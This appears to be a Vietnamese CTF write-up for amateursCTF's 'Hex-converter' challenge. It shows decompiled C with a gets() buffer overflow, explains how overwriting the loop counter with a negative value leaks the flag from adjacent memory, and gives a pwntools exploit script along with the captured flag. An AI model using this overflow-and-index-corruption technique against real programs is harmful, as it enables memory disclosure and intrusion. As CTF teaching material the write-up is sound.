# Hex-converter
## Source
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  char s[64]; // [rsp+0h] [rbp-60h] BYREF
  char v6[28]; // [rsp+40h] [rbp-20h] BYREF
  int v7; // [rsp+5Ch] [rbp-4h]

  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v7 = 0;
  puts("input text to convert to hex: ");
  gets(v6);
  v3 = fopen("flag.txt", "r");
  fgets(s, 64, v3);
  while ( v7 <= 15 )
    printf("%02X", (unsigned __int8)v6[v7++]);
  putchar(10);
  return 0;
}
```
## Phân tích
- Ta có lỗi bof ở `gets(v6)`. Thứ tự các biến `s[64] > v6[28] > v7`
- Như vậy ta có thể tận dụng lỗi bof để tràn biến qua v7. 
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/ae83a97c-1fcc-489b-b081-2b7c2b277da2)
- Ngoài ra nó còn out-of-bound. Khi mà không kiểm tra xem v7 có lớn hơn 0 hay không.
## Khai thác
- Ta sẽ overwrite giá trị v7 thành số âm để vòng `while` in flag
- Ta sẽ in bắt đầu từ `v6[-66]`
- Để đổi hex->ascii mình dùng web `kt.gy`
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/f2f721a9-14ed-4e1e-89c6-a1467dc0ba41)
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/68ddf2f5-ad88-4a0e-9130-1c0ba76e7257)


```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b* main+82

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31630)
else:
        p = process(exe.path)

GDB()
payload = b"a" * 28 + p32(0xffffffbe)
sla(b"hex:", payload)
p.interactive()
# amateursCTF{wait_this_wasnt_supposed_to_be_printed_76723}
```